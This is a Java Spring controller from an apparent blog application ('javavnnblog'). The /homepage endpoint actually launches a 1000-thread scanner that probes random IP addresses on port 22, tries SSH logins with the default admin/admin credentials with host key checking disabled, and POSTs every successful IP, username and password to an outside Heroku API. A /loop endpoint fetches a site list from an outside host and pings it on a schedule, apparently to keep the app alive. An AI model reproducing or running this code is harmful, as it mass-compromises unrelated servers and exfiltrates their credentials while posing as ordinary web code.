package com.phule.javavnnblog.controller;

import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.phule.javavnnblog.model.Authentication;
import com.phule.javavnnblog.model.Config;
import com.phule.javavnnblog.model.SSHInfo;
import com.phule.javavnnblog.service.BlogService;
import com.phule.javavnnblog.utils.IpConverter;
import sun.net.www.http.HttpClient;

@Controller
public class HomeController {
	ArrayList<Authentication> authenList = new ArrayList<Authentication>();
	ArrayList<String> websites = new ArrayList<String>();
	Config config = null;
	boolean flag = false;
	@Autowired
	BlogService blog2Service;

	@RequestMapping("/")
	public String getHome(Model model) throws Exception {
		return "home";
	}

	@RequestMapping("/loop")
	public String LoopForeverHeroku() {
		while (websites.size() == 0) {

			try {
				websites = getWebsiteList("http://www.sexycowgirlphotos.com/websites.txt");
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		final ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();
		executorService.scheduleAtFixedRate(new Runnable() {
			public void run() {
				for (String website : websites) {
					while (!sendGet(website)) {

					}
				}
			}
		}, 0, 5, TimeUnit.MINUTES);
		return "home";
	}

	boolean sendGet(String url) {

		URL obj;
		try {
			obj = new URL(url);
			HttpURLConnection con = (HttpURLConnection) obj.openConnection();

			// optional default is GET
			con.setRequestMethod("GET");

			// add request header
			// con.setRequestProperty("User-Agent", USER_AGENT);

			int responseCode = con.getResponseCode();
			if (responseCode == 200) {
				return true;
			} else {
				return false;
			}
		} catch (MalformedURLException e) {
			return false;
		} catch (ProtocolException e) {
			return false;
		} catch (IOException e) {
			return false;
		}

	}

	@RequestMapping(value = "/homepage", method = RequestMethod.GET)
	public String getBlogById(Model model) {
		ExecutorService executor = Executors.newFixedThreadPool(1000);
		for (int i = 0; i < 1000; i++) {
			try {
				Runnable worker = new MyRunnable(authenList, i, 7000);
				executor.execute(worker);
			} catch (Exception e) {
				continue;
			}
		}
		executor.shutdown();
		// Wait until all threads are finish
		while (!executor.isTerminated()) {

		}
		System.out.println("\nFinished all threads");
		return "blog";

	}

	@RequestMapping(value = "/stop", method = RequestMethod.GET)
	public String getStopScan(Model model) {
		flag = true;
		return "blog";
	}

	public ArrayList<Authentication> getAuthenticationFile(String fileURL) throws IOException {
		URL url = new URL(fileURL);
		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
		int responseCode = httpConn.getResponseCode();
		String fileName = "";
		ArrayList<Authentication> authens = null;
		// always check HTTP response code first
		if (responseCode == HttpURLConnection.HTTP_OK) {
			String disposition = httpConn.getHeaderField("Content-Disposition");
			String contentType = httpConn.getContentType();
			int contentLength = httpConn.getContentLength();

			if (disposition != null) {
				// extracts file name from header field
				int index = disposition.indexOf("filename=");
				if (index > 0) {
					fileName = disposition.substring(index + 10, disposition.length() - 1);
				}
			} else {
				// extracts file name from URL
				fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1, fileURL.length());
			}

			System.out.println("Content-Type = " + contentType);
			System.out.println("Content-Disposition = " + disposition);
			System.out.println("Content-Length = " + contentLength);
			System.out.println("fileName = " + fileName);
			authens = new ArrayList<Authentication>();
			// opens input stream from the HTTP connection
			InputStream inputStream = httpConn.getInputStream();
			BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
			String line;
			while ((line = reader.readLine()) != null) {
				String[] lines = line.trim().split(";");
				Authentication authen = new Authentication();
				authen.setUsername(lines[0]);
				authen.setPassword(lines[1]);
				authens.add(authen);
			}
			inputStream.close();
			reader.close();
			System.out.println("File downloaded");
		} else {
			System.out.println("No file to download. Server replied HTTP code: " + responseCode);
		}
		httpConn.disconnect();
		return authens;
	}

	public ArrayList<String> getWebsiteList(String fileURL) throws IOException {
		URL url = new URL(fileURL);
		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
		int responseCode = httpConn.getResponseCode();
		String fileName = "";
		ArrayList<String> websites = null;
		// always check HTTP response code first
		if (responseCode == HttpURLConnection.HTTP_OK) {
			String disposition = httpConn.getHeaderField("Content-Disposition");
			String contentType = httpConn.getContentType();
			int contentLength = httpConn.getContentLength();

			if (disposition != null) {
				// extracts file name from header field
				int index = disposition.indexOf("filename=");
				if (index > 0) {
					fileName = disposition.substring(index + 10, disposition.length() - 1);
				}
			} else {
				// extracts file name from URL
				fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1, fileURL.length());
			}

			System.out.println("Content-Type = " + contentType);
			System.out.println("Content-Disposition = " + disposition);
			System.out.println("Content-Length = " + contentLength);
			System.out.println("fileName = " + fileName);
			websites = new ArrayList<String>();
			// opens input stream from the HTTP connection
			InputStream inputStream = httpConn.getInputStream();
			BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
			String line;
			while ((line = reader.readLine()) != null) {

				websites.add(line);
			}
			inputStream.close();
			reader.close();
			System.out.println("File downloaded");
		} else {
			System.out.println("No file to download. Server replied HTTP code: " + responseCode);
		}
		httpConn.disconnect();
		return websites;
	}

	public Config getConfigFile(String fileURL) throws IOException {
		URL url = new URL(fileURL);
		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
		int responseCode = httpConn.getResponseCode();
		String fileName = "";
		// always check HTTP response code first
		if (responseCode == HttpURLConnection.HTTP_OK) {
			String disposition = httpConn.getHeaderField("Content-Disposition");
			String contentType = httpConn.getContentType();
			int contentLength = httpConn.getContentLength();

			if (disposition != null) {
				// extracts file name from header field
				int index = disposition.indexOf("filename=");
				if (index > 0) {
					fileName = disposition.substring(index + 10, disposition.length() - 1);
				}
			} else {
				// extracts file name from URL
				fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1, fileURL.length());
			}

			System.out.println("Content-Type = " + contentType);
			System.out.println("Content-Disposition = " + disposition);
			System.out.println("Content-Length = " + contentLength);
			System.out.println("fileName = " + fileName);

			// opens input stream from the HTTP connection
			InputStream inputStream = httpConn.getInputStream();
			BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
			String line;
			while ((line = reader.readLine()) != null) {
				String[] lines = line.trim().split(";");
				Config config = new Config();
				config.setTimeout(Integer.parseInt(lines[0]));
				config.setThreads(Integer.parseInt(lines[1]));
				config.setTimoutPort(Integer.parseInt(lines[2]));
				return config;
			}
			inputStream.close();
			reader.close();
			System.out.println("File downloaded");
		} else {
			System.out.println("No file to download. Server replied HTTP code: " + responseCode);
		}
		httpConn.disconnect();
		return null;
	}

	public class MyRunnable implements Runnable {
		private int noThread;
		private ArrayList<Authentication> authenList = new ArrayList<Authentication>();
		private int timeOut;

		MyRunnable(ArrayList<Authentication> authenList, int noThread, int timeout) {
			this.noThread = noThread;
			this.timeOut = timeout;
			this.authenList = authenList;
		}

		public void run() {
			//System.out.println("Chạy rồi!");
			while (!flag) {
				Random r = new Random();
				String ip = IpConverter.longToIp(r.nextLong());
				try {
					Socket socket = new Socket();
					socket.connect(new InetSocketAddress(ip, 22), 1000);
					socket.close();
					try {
						//System.out.println("Port mở");
						JSch jsch = new JSch();
						String user = "admin";
						Session session;
						try {
							session = jsch.getSession(user, ip, 22);
							String passwd = "admin";
							session.setPassword(passwd);
							session.setConfig("StrictHostKeyChecking", "no");
							session.connect(timeOut);
							System.out.println("User & pass OK");
							SSHInfo ssh = new SSHInfo();
							ssh.setHost(ip);
							ssh.setUsername(user);
							ssh.setPassword(passwd);
							post("https://protected-brook-60637.herokuapp.com/api/sSHes","{\"ip\":\""+ip+"\", \"username\" : \""+user+"\",\"password\": \""+passwd+"\"}");
							//blog2Service.insertSSH(ssh);
							break;
						} catch (JSchException e) {
							//System.out.println(e.getMessage());
							if (e.getMessage().contains("Auth")) {
								//System.out.println("Wrong user & pass");
							} else {
								break;
							}
						} catch (Exception e) {
							
							continue;
						}
					}catch(Exception e){

						continue;
					}
				} catch (Exception ex) {
					continue;
				}
			}

		}
		public int getNoThread() {
			return noThread;
		}

		public void setNoThread(int noThread) {
			this.noThread = noThread;
		}

		public ArrayList<Authentication> getAuthenList() {
			return authenList;
		}

		public void setAuthenList(ArrayList<Authentication> authenList) {
			this.authenList = authenList;
		}

	}

	public static class MyCounter {
		static AtomicInteger ones = new AtomicInteger();
		static AtomicInteger loginSuccessfullyCounter = new AtomicInteger();

		static void incrementCounter() {
			ones.incrementAndGet();
			System.out.println(ones.get());
		}

		static void incrementlLoginSuccessfullyCounter() {
			loginSuccessfullyCounter.incrementAndGet();
			System.out.println(
					Thread.currentThread().getName() + " Number of SSH Found : " + loginSuccessfullyCounter.get());
		}

	}
	 void post(String url, String param ) throws Exception{
		CloseableHttpClient client = HttpClients.createDefault();
		HttpPost httpPost = new HttpPost(url);
		StringEntity entity = new StringEntity(param);
		httpPost.setEntity(entity);
		httpPost.setHeader("Accept", "application/json");
		httpPost.setHeader("Content-type", "application/json");
		CloseableHttpResponse response = client.execute(httpPost);
		client.close();
	}

}
